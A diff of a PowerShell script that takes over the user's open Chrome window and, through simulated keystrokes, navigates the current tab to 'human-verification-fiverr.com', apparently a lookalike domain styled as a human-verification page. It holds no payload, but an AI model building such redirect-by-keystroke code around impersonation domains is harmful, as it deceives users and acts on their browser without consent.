@@ -1,29 +1,45 @@
-$url = "https://human-verification-fiverr.com/"
+param(
+    [string]$Url = "https://human-verification-fiverr.com/"
+)
  
-# Check if Chrome is running
-$chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
- 
-if ($chromeProcesses) {
-    Write-Host "Chrome is already running. Opening URL in new tab..." -ForegroundColor Green
-    # Method 1: Using Start-Process with --new-tab
-    Start-Process "chrome.exe" "--new-tab $url"
-    # Alternative: Activate existing Chrome window
-    # This brings Chrome to foreground
-    Add-Type @"
-        using System;
-        using System.Runtime.InteropServices;
-        public class WindowHelper {
-            [DllImport("user32.dll")]
-            [return: MarshalAs(UnmanagedType.Bool)]
-            public static extern bool SetForegroundWindow(IntPtr hWnd);
-        }
-"@
-    # Get the main Chrome window handle
-    $chromeProcess = $chromeProcesses | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1
-    if ($chromeProcess -and $chromeProcess.MainWindowHandle -ne [IntPtr]::Zero) {
-        [WindowHelper]::SetForegroundWindow($chromeProcess.MainWindowHandle)
+function Use-SameChromeTab {
+    param(
+        [string]$Url
+    )
+    # Check if Chrome is running
+    $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
+    if (-not $chromeProcesses) {
+        Write-Host "Chrome not running. Starting Chrome..." -ForegroundColor Yellow
+        Start-Process "chrome.exe" $Url
+        return
     }
-} else {
-    Write-Host "Chrome is not running. Starting Chrome with URL..." -ForegroundColor Yellow
-    Start-Process "chrome.exe" $url
+    # Bring Chrome to foreground
+    try {
+        $wshell = New-Object -ComObject wscript.shell
+        $success = $wshell.AppActivate("Google Chrome")
+        if ($success) {
+            Write-Host "Chrome activated. Attempting to navigate..." -ForegroundColor Green
+            # Wait a moment
+            Start-Sleep -Milliseconds 500
+            # Focus address bar (Ctrl+L or Alt+D)
+            $wshell.SendKeys("^l")  # Ctrl+L to focus address bar
+            Start-Sleep -Milliseconds 200
+            # Type new URL
+            $wshell.SendKeys($Url)
+            Start-Sleep -Milliseconds 200
+            # Press Enter
+            $wshell.SendKeys("~")  # Enter key
+            Write-Host "✅ Navigation command sent to Chrome" -ForegroundColor Green
+        } else {
+            Write-Host "Could not activate Chrome. Opening new tab..." -ForegroundColor Yellow
+            Start-Process "chrome.exe" "--new-tab $Url"
+        }
+    } catch {
+        Write-Host "Error: $_" -ForegroundColor Red
+        Write-Host "Opening in new tab..." -ForegroundColor Yellow
+        Start-Process "chrome.exe" "--new-tab $Url"
+    }
 }
+ 
+# Run
+Use-SameChromeTab -Url $Url
